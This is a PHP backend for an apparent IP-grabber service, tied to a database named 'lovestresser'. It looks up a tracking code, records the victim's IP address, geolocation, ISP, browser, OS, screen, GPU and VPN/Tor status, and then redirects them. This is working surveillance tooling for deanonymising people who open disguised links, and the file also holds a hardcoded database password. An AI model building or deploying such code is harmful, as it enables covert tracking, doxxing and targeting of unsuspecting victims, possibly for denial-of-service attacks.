<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    $servername = "localhost";
    $username = "love";
    $password = "XtdQ/sib>b6VPn3s%59:Y,XP.R;_5494";
    $dbname = "lovestresser";

    $conn = new mysqli($servername, $username, $password, $dbname);

    if ($conn->connect_error) {
        error_log("Connection failed: " . $conn->connect_error);
        die(json_encode(['error' => 'Connection failed: ' . $conn->connect_error]));
    }

    $data = json_decode(file_get_contents('php://input'), true);
    
    if (!$data) {
        error_log("Failed to decode JSON");
        die(json_encode(['error' => 'Failed to decode JSON']));
    }

    $code = $data['code'] ?? null;

    if (!$code) {
        error_log("Code not provided");
        die(json_encode(['error' => 'Code not provided']));
    }

    $stmt = $conn->prepare("SELECT redirect_url, user_id FROM grabber_ids WHERE code = ?");
    if (!$stmt) {
        error_log("Prepare failed: " . $conn->error);
        die(json_encode(['error' => 'Prepare failed: ' . $conn->error]));
    }

    $stmt->bind_param("s", $code);

    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error);
        die(json_encode(['error' => 'Execute failed: ' . $stmt->error]));
    }

    $stmt->bind_result($redirect_url, $user_id);

    $result_fetched = false;
    if ($stmt->fetch()) {
        $result_fetched = true;
    }

    $stmt->close();

    if ($result_fetched) {
        $sql = "
            INSERT INTO grabber_data 
            (code, user_id, ip, hostname, city, region, country, loc, org, postal, timezone, browser, os, screen, gpu, is_vpn, is_proxy, is_tor) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ";

        $stmt_insert = $conn->prepare($sql);
        
        if (!$stmt_insert) {
            error_log("Insert prepare failed: " . $conn->error);
            die(json_encode(['error' => 'Insert prepare failed: ' . $conn->error]));
        }

        $stmt_insert->bind_param(
            "sssssssssssssssiii", 
            $code, $user_id, $data['ip'], $data['hostname'], $data['city'], $data['region'], 
            $data['country'], $data['loc'], $data['org'], $data['postal'], $data['timezone'], 
            $data['browser'], $data['os'], $data['screen'], $data['gpu'], 
            $data['isVPN'], $data['isProxy'], $data['isTOR']
        );

        if (!$stmt_insert->execute()) {
            error_log("Insert execute failed: " . $stmt_insert->error);
            die(json_encode(['error' => 'Insert execute failed: ' . $stmt_insert->error]));
        }

        $stmt_insert->close();

        echo json_encode(['redirect_url' => $redirect_url]);
    } else {
        error_log("Code not found");
        echo json_encode(['redirect_url' => 'default_url_if_code_not_found']);
    }

    $conn->close();
}
?>